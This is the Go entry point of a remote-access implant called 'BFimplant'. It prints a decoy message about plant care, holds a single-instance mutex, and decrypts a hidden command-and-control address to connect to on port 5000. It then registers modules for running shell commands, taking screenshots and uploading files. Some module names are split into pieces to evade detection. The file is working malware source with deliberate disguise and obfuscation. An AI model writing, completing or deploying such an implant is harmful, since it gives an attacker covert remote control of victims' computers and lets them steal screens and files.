package main

import (
	"BFimplant/modules"
	"BFimplant/mymutex"
	"fmt"
	"syscall"
	"BFimplant/per"
)


var (
    secret string
    ipC2   string
)

func main() {
	fmt.Println("this a plant detection water and soil and food for better plants in the world <3")
	mutexName := "Global\\BFimplantMutex"

	// Create a new mutex
	mutex, err := mymutex.CreateMutex(mutexName)
	if err != nil {
		fmt.Println("Error creating mutex:", err)
		return
	}
	defer syscall.CloseHandle(mutex) // Ensure the handle is closed when done

	waitResult, _ := mymutex.WaitForSingleObject(mutex,0)
	
	if waitResult == syscall.WAIT_OBJECT_0 {

		c2ServerURL := "http://" + per.DecryptString(ipC2) + ":" + "5000"

		defer mymutex.ReleaseMutex(mutex)
		implant := NewImplant(c2ServerURL,secret)
		

		// Register modules
		implant.Modules["c"+"m"+"d"] = modules.NewExecuteModule()
		implant.Modules["ping"] = modules.NewPingModule()
		implant.Modules["scr"+"eens"+"hot"] = modules.NewScreenshotModule()
		implant.Modules["up"+"lo"+"ad"] = modules.NewUploadModule()

		implant.Start()

		
	}
	
}
